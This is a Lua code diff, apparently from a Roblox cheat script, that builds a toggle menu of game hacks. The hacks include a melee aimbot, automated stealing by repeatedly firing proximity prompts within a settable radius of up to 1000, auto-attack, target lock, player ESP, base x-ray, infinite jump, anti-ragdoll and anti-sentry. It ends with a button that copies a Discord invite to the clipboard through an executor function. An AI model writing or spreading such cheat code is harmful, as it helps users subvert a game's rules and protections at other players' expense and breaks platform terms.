+        TweenService:Create(btn, TweenInfo.new(0.08,Enum.EasingStyle.Back), {Size=clickS}):Play()
+    end)
+    btn.MouseButton1Up:Connect(function()
+        TweenService:Create(btn, TweenInfo.new(0.1,Enum.EasingStyle.Back), {Size=hoverS}):Play()
+    end)
+
+    return btn, setOn, setOff, isOn
+end
+
+---------------------------
+-- NUMBER INPUT FACTORY --
+---------------------------
+local function MakeNumInput(parent, label, default, minV, maxV, callback)
+    local row = Instance.new("Frame")
+    row.Size = UDim2.new(1,0,0,46)
+    row.BackgroundColor3 = BTN_DARK
+    row.Parent = parent
+
+    Instance.new("UICorner", row).CornerRadius = UDim.new(0,12)
+    local rs = Instance.new("UIStroke", row)
+    rs.Color = STROKE_OFF
+    rs.Thickness = 1.5
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(0.55,0,1,0)
+    lbl.Position = UDim2.new(0,14,0,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = label
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextSize = 12
+    lbl.TextColor3 = Color3.fromRGB(140,140,140)
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.Parent = row
+
+    local box = Instance.new("TextBox")
+    box.Size = UDim2.new(0,72,0,30)
+    box.Position = UDim2.new(1,-82,0.5,-15)
+    box.BackgroundColor3 = Color3.fromRGB(16,16,16)
+    box.TextColor3 = TEXT_ON
+    box.Font = Enum.Font.GothamBold
+    box.TextSize = 13
+    box.Text = tostring(default)
+    box.ClearTextOnFocus = false
+    box.Parent = row
+
+    Instance.new("UICorner", box).CornerRadius = UDim.new(0,8)
+    local bxs = Instance.new("UIStroke", box)
+    bxs.Color = STROKE_OFF
+    bxs.Thickness = 1
+
+    box.Focused:Connect(function()
+        tw(bxs,0.2,{Color=PURPLE})
+    end)
+    box.FocusLost:Connect(function(entered)
+        tw(bxs,0.2,{Color=STROKE_OFF})
+        if entered then
+            local n = tonumber(box.Text)
+            if n and n >= minV and n <= maxV then
+                callback(n)
+            else
+                box.Text = tostring(default)
+            end
+        end
+    end)
+end
+
+-----------------------
+-- POPULATE TOGGLES --
+-----------------------
+local function AddToggle(section, label, onFn, offFn)
+    local btn, setOn, setOff, isOn = MakeButton(frames[section], label)
+    btn.MouseButton1Click:Connect(function()
+        if isOn() then
+            setOff()
+            if offFn then offFn() end
+        else
+            setOn()
+            if onFn then onFn() end
+        end
+    end)
+end
+
+-- COMBAT
+AddToggle("Combat", "Melee Aimbot",
+    function() meleeEnabled = true; if character then createMeleeAimbot(character) end end,
+    function() disableMeleeAimbot() end
+)
+
+AddToggle("Combat", "Auto Steal Nearest",
+    function()
+        autoStealEnabled = true
+        createStealCircle(grabRadius)
+        pbBg.Visible = true
+        local uc = RunService.RenderStepped:Connect(updateStealCircle)
+
+        task.spawn(function()
+            while autoStealEnabled do
+                local char = lp.Character
+                if char then
+                    local root = char:FindFirstChild("HumanoidRootPart")
+                    if root then
+                        local prompt = findNearestSteal(root)
+                        if prompt then
+                            pbBg.Visible = true
+                            local st = tick()
+                            while autoStealEnabled and findNearestSteal(root) == prompt do
+                                local p = math.clamp((tick() - st) / 1.2, 0, 1)
+                                pbFill.Size = UDim2.new(p,0,1,0)
+                                pbPct.Text = math.floor(p * 100).."%"
+                                if p >= 0.99 then
+                                    pcall(fireproximityprompt, prompt)
+                                    task.wait(0.1)
+                                    pcall(fireproximityprompt, prompt)
+                                    st = tick()
+                                end
+                                task.wait()
+                            end
+                        end
+                    end
+                end
+                resetBar()
+                task.wait(0.15)
+            end
+            resetBar(true)
+            hideStealCircle()
+            if uc then uc:Disconnect() end
+        end)
+    end,
+    function()
+        autoStealEnabled = false
+        resetBar(true)
+        hideStealCircle()
+    end
+)
+
+AddToggle("Combat", "Auto Walk",
+    function() autoWalkEnabled = true; createAutoWalkGui() end,
+    function() autoWalkEnabled = false; destroyAutoWalkGui() end
+)
+
+AddToggle("Combat", "Lock Target",
+    function() createLockGui() end,
+    function() destroyLockGui() end
+)
+
+AddToggle("Combat", "Auto Medusa",
+    function() AutoMedusaEnabled = true; InitMedusa() end,
+    function() AutoMedusaEnabled = false end
+)
+
+AddToggle("Combat", "Auto Bat",
+    function()
+        autoBatActive = true
+        autoBatLoop = task.spawn(function()
+            while autoBatActive do
+                local char = lp.Character
+                if char then
+                    local t = char:FindFirstChild("Bat")
+                    if t and t:IsA("Tool") then pcall(function() t:Activate() end) end
+                end
+                task.wait(0.4)
+            end
+        end)
+    end,
+    function() autoBatActive = false end
+)
+
+AddToggle("Combat", "Anti Sentry",
+    function() startAntiSentry() end,
+    function() stopAntiSentry() end
+)
+
+-- PLAYER
+AddToggle("Player", "Speed Customizer",
+    function() scGui.Enabled = true end,
+    function() scGui.Enabled = false end
+)
+
+AddToggle("Player", "No Walk Animation",
+    function()
+        local char = lp.Character
+        if not char then return end
+        local anim = char:FindFirstChild("Animate")
+        if anim then savedAnimate = anim; anim.Disabled = true end
+        local hm = char:FindFirstChildOfClass("Humanoid")
+        if hm then for _, t in ipairs(hm:GetPlayingAnimationTracks()) do t:Stop() end end
+    end,
+    function() if savedAnimate then savedAnimate.Disabled = false; savedAnimate = nil end end
+)
+
+AddToggle("Player", "Anti Ragdoll",
+    function() toggleAntiRagdoll(true) end,
+    function() toggleAntiRagdoll(false) end
+)
+
+AddToggle("Player", "Spin Body",
+    function() createSpinButton() end,
+    function() removeSpinButton() end
+)
+
+AddToggle("Player", "Slow Fall",
+    function() slowFallEnabled = true end,
+    function() slowFallEnabled = false end
+)
+
+AddToggle("Player", "Infinite Jump",
+    function() infiniteJumpEnabled = true end,
+    function() infiniteJumpEnabled = false end
+)
+
+-- VISUAL
+AddToggle("Visual", "ESP Players",
+    function() toggleESPPlayers(true) end,
+    function() toggleESPPlayers(false) end
+)
+
+AddToggle("Visual", "Anti Bee & Disco",
+    function() enableAntiBee() end,
+    function() disableAntiBee() end
+)
+
+AddToggle("Visual", "Xray Base",
+    function() toggleESPBases(true) end,
+    function() toggleESPBases(false) end
+)
+
+AddToggle("Visual", "Optimizer",
+    function() enableOptimizer() end,
+    function() disableOptimizer() end
+)
+
+AddToggle("Visual", "Anti FPS Devourer",
+    function() enableAntiFPSDevourer() end,
+    function() disableAntiFPSDevourer() end
+)
+
+-- SETTINGS
+MakeNumInput(frames["Settings"], "Steal Radius", grabRadius, 1, 1000, function(v)
+    grabRadius = v
+    if stealCircle then stealCircle.Size = Vector3.new(0.05, v*2, v*2) end
+end)
+
+MakeNumInput(frames["Settings"], "Lock Range", LOCK_RADIUS, 5, 500, function(v)
+    LOCK_RADIUS = v
+end)
+
+MakeNumInput(frames["Settings"], "Medusa Radius", MEDUSA_RADIUS, 1, 200, function(v)
+    MEDUSA_RADIUS = v
+    if medusaPart then medusaPart.Size = Vector3.new(0.05, v*2, v*2) end
+end)
+
+MakeNumInput(frames["Settings"], "Melee Range", MELEE_RANGE, 1, 50, function(v)
+    MELEE_RANGE = v
+end)
+
+-- Discord row
+local dcRow = Instance.new("Frame")
+dcRow.Size = UDim2.new(1,0,0,36)
+dcRow.BackgroundColor3 = BTN_DARK
+dcRow.Parent = frames["Settings"]
+
+Instance.new("UICorner", dcRow).CornerRadius = UDim.new(0,12)
+
+local dcBtn = Instance.new("TextButton")
+dcBtn.Size = UDim2.new(1,0,1,0)
+dcBtn.BackgroundTransparency = 1
+dcBtn.Text = "📋 discord.gg/eQCrT7MnSV"
+dcBtn.Font = Enum.Font.Gotham
+dcBtn.TextSize = 11
+dcBtn.TextColor3 = Color3.fromRGB(130,130,130)
+dcBtn.Parent = dcRow
+
+dcBtn.MouseButton1Click:Connect(function()
+    pcall(function() setclipboard("discord.gg/eQCrT7MnSV") end)
+    dcBtn.Text = "✅ Copied!"
+    task.wait(1.5)
+    dcBtn.Text = "📋 discord.gg/eQCrT7MnSV"
+end)
+
+ShowSection("Combat")
